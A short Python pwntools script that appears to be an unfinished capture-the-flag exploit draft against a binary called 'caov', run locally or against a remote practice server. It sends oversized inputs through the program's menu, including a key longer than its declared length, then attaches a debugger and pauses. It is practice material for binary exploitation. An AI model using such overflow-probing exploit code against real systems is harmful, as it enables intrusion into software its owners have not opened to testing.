import sys
import time
from pwn import *
context.log_level='debug'
#context.arch='amd64'
while True :
	try:
		if len(sys.argv)==1 :
			io=process('./caov')
			elf=ELF('./caov')
			libc=ELF('/lib/x86_64-linux-gnu/libc-2.23.so')
		else :
			io=remote('node3.buuoj.cn',28043)
			elf=ELF('caov')
			libc=ELF('/lib/x86_64-linux-gnu/libc-2.23.so')

		io.recv()
		io.sendline('1'*0x50)
		io.recv()
		io.sendline('a'*0x60)
		io.recv()
		io.sendline(str(0x222))
		def show():
			io.sendlineafter('Your choice: ','1')

		def edit(a,b,c,d):
			io.sendlineafter('Your choice: ','2')
			io.sendlineafter('Enter your name: ',a)
			io.sendlineafter('New key length: ',str(b))
			io.sendlineafter('Key: ',c)
			io.sendlineafter('Value: ',str(d))



		gdb.attach(io)

		edit('kk',0x48,'1'*0xe0,0x1)







		
		pause()
		io.interactive()
	except EOFError:
	    io.close()

